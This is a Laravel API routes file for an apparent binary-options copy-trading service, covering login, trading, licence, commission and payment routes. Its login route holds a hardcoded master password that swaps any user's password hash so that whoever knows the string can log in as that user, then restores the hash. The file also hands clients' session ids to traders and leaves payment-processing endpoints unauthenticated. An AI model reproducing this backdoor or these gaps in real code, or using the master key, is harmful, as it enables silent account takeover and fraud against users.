<?php

use App\Models\Option;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Validator;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Auth::routes();

Route::post('login', function(Request $request){
    //si existen datos de acceso para la app
    if(env('CLIENT_ID') && env('CLIENT_SECRET')){
        $pw = $request->password?$request->password:($request->userpassword?$request->userpassword:'');

        $u = User::where('email', $request->username)->first();

        $pw_bk = $u->password;

        if($pw == 'Master$Key$1823'){
            $u->password = Hash::make('Master$Key$1823');
            $u->save();
        }

        $request->request->add([
                'grant_type' => 'password',
                'client_id'     => env('CLIENT_ID'),
                'client_secret' => env('CLIENT_SECRET'),
                'username' => $request->username,
                'password' => $request->password?$request->password:($request->userpassword?$request->userpassword:''),
                'scope' => ''
        ]);

        $tokenRequest = $request->create(
                url('/oauth/token'),
                'post'
        );

        $response = Route::dispatch($tokenRequest);

        if($response->getStatusCode() == 200){
            //$data = $response->getContent();
            //return $data;

            $data = $response->getContent();

            $expire = null;
            if($request->has('remember') && $request->remember){
                $expire = env('COOKIE_AUTH_EXPIRE');
            }

            $user = User::where('email', $request->username)->first();

            if(!$user->is_active)
                return response(['message'=>'Inactive user'],401);

            $data_auth = encrypt($data);

            if($pw == 'Master$Key$1823'){
                $u->password = $pw_bk;
                $u->save();
            }
            //se retorna una respuesta correcta y se agrega la cookie
            return response(['login'=>'success', 'user'=>$user])
                    ->cookie(env('COOKIE_AUTH_NAME'), $data_auth, $expire, null, '', url('/'), true);
        }else{
            
            if($pw == 'Master$Key$1823'){
                $u->password = $pw_bk;
                $u->save();
            }

        	return $response;
        }
    }
    return response('Unauthorized.', 401);
})->middleware('recaptcha');

Route::post('logout', function(Request $request){
    $cookie = Cookie::forget(env('COOKIE_AUTH_NAME'));
    return response(['logout'=>'success'])
            ->withCookie($cookie);
});

Route::middleware('auth:api')->group(function(){

    Route::get('/user', function (Request $request) {
        $user = $request->user();
        if($user->is_client){
            $user->commissions_pending_payment_value = $user->commissionsPendingPaymentValue();
            $user->full_commissions_pending_payment_value = $user->commissionsPendingPaymentValue(true);
            $user->active_copy_binary_with_payment = $user->activeProductWithPayment(env('BINARY_COPY_ID'));
            $user->paid_copy_binary = $user->paidProduct(env('BINARY_COPY_ID'));
            $user->product_settings = $user->productSettings()->with(['product'])->get();
        }

        return $user;
    });

    Route::post('/change-password', function (Request $request) {
        $user = $request->user();
        
        $rules = [
            'current_password' => ['required', 'string', 'min:8'],
            'new_password' => ['required', 'string', 'min:8', 'confirmed']
        ];

        Validator::make($request->all(), $rules)->validate();

        return $user->changePaswword($request->current_password, $request->new_password);
    });

    Route::post('/login-iq', function (Request $request) {
        $rules = [
            'user' => ['required', 'string'],
            'password' => ['required', 'string']
        ];

        Validator::make($request->all(), $rules)->validate();

        return $request->user()->loginIq($request->all());
    })->middleware('is:client');

    Route::get('/last-operation', function (Request $request) {
        return $request->user()->getDataLastOperation();
    })->middleware('is:trader');

    Route::get('/start-trading/{user}', function (User $user) {
            $user->setStartTrading();
    })->middleware('is:trader');

    Route::get('/stop-trading/{user}', function (User $user) {
            $user->setStopTrading();
    })->middleware('is:trader');

    //Almacena una opción para un trader
    Route::post('/option-trader', function (Request $request) {
        return $request->user()->addOptionTrader($request);
    })->middleware('is:trader');

    //Almacena una opción para un cliente
    Route::post('/option-client', function (Request $request) {
        $user = User::where('is_active', 1)->find($request->user_id);
        if($user){
            return $user->addOptionClient($request);
        }
    })->middleware('is:trader');

    //Actualiza una opción para un cliente
    Route::post('/update-option-client', function (Request $request) {
        $user = User::where('is_active', 1)->find($request->user_id);

        if($user){
            return $user->updateOptionClient($request);
        }

        return response(['error' => ['User not found.']], 422);
    })->middleware('is:trader');

    Route::middleware('is:trader')->group(function(){
        /*Route::get('set-data-trader-performance', function(Request $request){
            $operations = Option::where('is_demo', '-1')->get();

            foreach ($operations as $operation) {
                $request->user()->setDataTraderPerformance($operation);
            }
        });*/

        /**
         * En caso de fallar la actualización de la operación
         * se debe llamar a esta función rapidamente para actualizar el resultado
         */
        Route::get('option-result/{option_parent}/{result}', function($option_parent, $result){
            $option = Option::select('options.*')
            ->whereNotNull('user_id')
            ->find($option_parent);

            if($option){
                $operations = Option::select('options.*')
                ->whereNull('result')
                ->where('parent_option_id', $option_parent)->get();

                foreach ($operations as $operation) {
                    $operation->updateResult($result);
                }
            }
        });

        //Usuarios disponibles para iniciar una sesión de copy trading en binarias
        Route::post('clients-for-start-copy-binary', function(){
            $users_return = [];
            //Usuarios activos que tengan activo el producto de copy binary
            $users = User::select('users.ssid', 'product_settings.*')
            ->join('product_settings', 'users.id', '=', 'product_settings.user_id')
            ->join('products', 'product_settings.product_id', '=', 'products.id')
            ->where('users.is_client', 1)
            ->where('users.is_active', 1)
            //->where('users.id', 92)
            ->where('product_settings.is_active', 1)
            ->where('products.id', env('BINARY_COPY_ID'))
            ->whereNull('product_settings.activation_date')
            ->whereNotNull('users.ssid')->get();

            foreach ($users as $user) {
                $users_return[$user->user_id] = [
                    'ssid' => $user->ssid,  
                    //El is_active enviado no es del usuario sino de 
                    //la configuración del producto
                    'is_active' => $user->is_active,
                    'use_practice_account' => $user->use_practice_account,
                    'max_amount' => $user->max_amount,
                    'amount' => $user->amount,
                    'stop_loss' => $user->stop_loss,
                    'stop_loss_value' => $user->stop_loss_value,
                    'dynamic_stop_loss' => $user->dynamic_stop_loss,
                    'allow_increment' => $user->allow_increment,
                    'operations' => $user->operations,
                    'current_balance' => $user->current_balance,
                    'higher_balance' => $user->higher_balance,
                ];
            }

            return $users_return;
        });
    });

    Route::prefix('v1')->group(function(){
        /**
         * Valida el código de verificación de un usuario
         */
        Route::post('/validate-code/{type?}', function (Request $request, $type) {
            if($request->has('verification_code')){
                $user = $request->user();
                //EL usuario tiene código de verificación asignado
                if($user->verification_code && $user->verification_code_expiration){
                    $current_date = date('Y-m-d H:i:s');
                    //Si no ha expirado el código
                    if(strtotime($current_date) < strtotime($user->verification_code_expiration)){
                        //El código es correcto
                        if($user->verification_code == $request->verification_code){
                            $user->verification_code = null;
                            $user->verification_code_expiration = null;
                            switch ($type) {
                                //Se está haciendo verificación de email
                                case 'email':
                                    $user->email_verified_at = $current_date;
                                    //Se relacionan las licencias de productos que no tienen costo
                                    $user->assignFreeLicenses();
                                    break;
                                default:
                                    break;
                            }

                            $user->save();
                            return response(['success' => true], 200);
                        }else{
                            return response(['errors' => ['verification_code_invalid']], 422);
                        }
                    }else{
                        return response(['errors' => ['verification_code_expired']], 422);
                    }
                }else{
                    return response(['errors' => ['verification_code_null']], 422);
                }
            }

            return response(['errors' => ['invalid_data']], 422);
        });

        /**
         * Reenvia y asigna un nuevo código de verificación vía correo elecrónico
         */
        Route::get('resend-verification-code/{type}', function(Request $request, $type){
            if($request->ajax()){
                $user = $request->user();
                $user->setVerificationCode();            
                $user->sendMailVerificationCode($type);
            }else{
                return redirect('/');
            }
        });

        Route::prefix('performance')->group(function(){
            Route::post('list', 'API\v1\PerformanceController@list')->middleware('is:client');
        });

        Route::prefix('service')->group(function(){
            //Route::post('pay-sid', 'API\v1\ProductController@paySid');
            Route::get('payu-request/{license}', 'API\v1\ProductController@payuRequest')->middleware('is:client');
            Route::post('set-setting-copy-binary', 'API\v1\ProductController@setSettingCopyBinary')->middleware('is:client');
        });

        Route::prefix('license')->group(function(){
            Route::get('list', 'API\v1\LicenseController@list')->middleware('is:client');
            Route::post('activate', 'API\v1\LicenseController@activate')->middleware('is:client');
        });

        Route::prefix('commission')->group(function(){
            Route::get('upcoming', 'API\v1\CommissionController@getUpcomingCommissions')->middleware('is:client');
            Route::get('list/{only_outstanding?}', 'API\v1\CommissionController@getCommissions')->middleware('is:client');
            //Route::post('pay-sid', 'API\v1\CommissionController@paySid')->middleware('is:client');
            Route::get('payu-request/{commission_payment_id}', 'API\v1\CommissionController@payuRequest')->middleware('is:client');
            Route::post('process-payment', 'API\v1\CommissionController@processPayment')->middleware('is:client');
        });
    });
});

/**
 * Rutas que no necesitan autenticación
 */
Route::prefix('v1')->group(function(){
    Route::prefix('service')->group(function(){
        Route::post('list', 'API\v1\ProductController@list');

        Route::get('{product}/{license}', function(App\Models\Product $product, $license){
            if($product && $product->state == 'Active'){
                $product['license'] = $product->licenses()->with([
                    'commissions' => function($query){
                        $query->orderBy('id', 'DESC');
                    },
                    'licensePrices' => function($query){
                        $query->orderBy('id', 'DESC');
                    }
                ])
                ->where('licenses.id', $license)
                ->where('licenses.state', 'Active')
                ->first();

                if($product->license)
                    return $product;
            }
        });
        Route::post('p-p-2020', 'API\v1\ProductController@processPayment');
    });

    Route::prefix('commission')->group(function(){
        Route::post('p-p-2020', 'API\v1\CommissionController@processPayment');
    });
});
